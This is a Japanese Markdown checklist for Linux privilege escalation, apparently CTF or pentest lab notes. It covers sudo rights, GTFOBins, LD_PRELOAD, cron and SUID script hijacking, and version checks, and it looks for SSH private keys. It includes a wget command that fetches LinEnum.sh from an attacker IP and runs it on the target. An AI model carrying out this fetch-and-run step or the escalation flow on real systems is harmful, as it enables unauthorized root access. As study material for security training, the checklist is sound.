# Linux Privilege Escalation Flow

## 実行フロー
1. sudo -l の実行
2. LinEnum の実行
3. ホームディレクトリの確認
4. Cron の確認
5. SUID / SGID の確認
6. Bash のバージョン確認
7. Sudo のバージョン確認
8. 機密ファイルのパーミッション確認


## 1. sudo -l の実行
### root 権限で実行可能なコマンドが存在する場合
[GTFOBins](https://gtfobins.github.io/) で検索

### ユーザー環境から継承された環境変数が存在する場合
- LD_PRELOAD が存在する : [こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#ld_preload-%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88)  
- LD_LIBRARY_PATH が存在する : [こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#ld_library_path-%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88)

## 2. LinEnum の実行
```
wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; /tmp/LinEnum.sh
```

## 3. ホームディレクトリの確認
- [ ] 他のユーザーは存在するか
- [ ] ディレクトリにアクセスできるか
- [ ] SSH 秘密鍵は取得できるか
- [ ] 手がかりとなるファイルは存在するか
- [ ] フラグとなるファイルは存在するか

## 4. Cron の確認
- [ ] Crontab に怪しいファイルは存在するか
- [ ] 指定方法はスクリプト名 or 絶対パス
- [ ] スクリプトは root 権限で実行されるか
- [ ] スクリプトは置き換え可能か（ディレクトリに書き込み権限はあるか）
- [ ] スクリプトは書き換え可能か（ファイルに書き込み権限はあるか）
- [ ] 内部で実行されているプログラム（コマンド）の指定方法はスクリプト名 or 絶対パス

存在する場合...
### 4-1. 指定方法がスクリプト名（絶対パスでない）の場合
環境変数 PATHの追加は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0-path)

### 4-2. 指定方法が絶対パスの場合
#### スクリプトの置き換え / 書き換え
- ディレクトリに書き込み権限あり : スクリプトの置き換え  
- ファイルに書き込み権限あり : スクリプトの書き換え

#### スクリプト内容の確認
・シェルスクリプトの場合
```
cat [FILE]
```

・バイナリファイルの場合  
実行されているプログラム（コマンド）の確認
```
strings [FILE]
```

指定方法がコマンド名（絶対パスでない）の場合 : [こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0)

指定方法が絶対パスの場合
- ディレクトリに書き込み権限あり : スクリプトの置き換え  
- ファイルに書き込み権限あり : スクリプトの書き換え

※ 内部でワイルドカードが利用されている場合：[こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E3%83%AF%E3%82%A4%E3%83%AB%E3%83%89%E3%82%AB%E3%83%BC%E3%83%891)

#### 読み込まれている共有ライブラリの確認
・環境変数 LD_LIBRARY_PATH が利用できる場合 : [こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#ld_library_path-%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88)

・環境変数 LD_LIBRARY_PATH が利用できない場合: [こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E5%85%B1%E6%9C%89%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E5%88%A9%E7%94%A8)  
読み込みエラーになっている共有ライブラリのうち、ディレクトリ、ファイルのいずれかに書き込み権限がないか確認。

- ディレクトリに書き込み権限あり : スクリプトの置き換え  
- ファイルに書き込み権限あり : スクリプトの書き換え

## 5. SUID / SGID の確認
- [ ] 既存の脆弱性（Exim <= 4.84-3 など）は存在するか
- [ ] スクリプトは置き換え可能か（ディレクトリに書き込み権限はあるか）
- [ ] スクリプトは書き換え可能か（ファイルに書き込み権限はあるか）
- [ ] 内部で実行されているプログラム（コマンド）の指定方法はスクリプト名 or 絶対パス

大部分は「4. Cron の確認」の「4-2. 指定方法が絶対パスの場合」を参照。

<!-- ・ディレクトリ、ファイルに書き込み権限がある場合  
共有オブジェクトの利用は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E5%85%B1%E6%9C%89%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E5%88%A9%E7%94%A8)

・内部で実行されているプログラム（コマンド）がコマンド名で指定されている場合  
環境変数の利用は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0) -->

<!-- <dl>
  <dt>ディレクトリ、ファイルに書き込み権限がある場合</dt>
  <dd>共有オブジェクトの利用は<a href="https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E5%85%B1%E6%9C%89%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E5%88%A9%E7%94%A8">こちら</a></dd>
  <dt>内部で実行されているプログラム（コマンド）がコマンド名で指定されている場合</dt>
  <dd>環境変数の利用は<a href="https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0">こちら</a></dd>
</dl> 
-->

## 6. Bash のバージョン確認
参照は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E3%82%B7%E3%82%A7%E3%83%AB%E3%81%AE%E4%BB%95%E6%A7%98-1)

## 7. Sudo のバージョン確認
参照は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%82%92%E7%A2%BA%E8%AA%8D)

## 8. 機密ファイルのパーミッション確認
参照は[こちら](https://github.com/tipotto/CheatSheet/blob/main/privesc.md#%E6%A9%9F%E5%AF%86%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%91%E3%83%BC%E3%83%9F%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%A2%BA%E8%AA%8D)

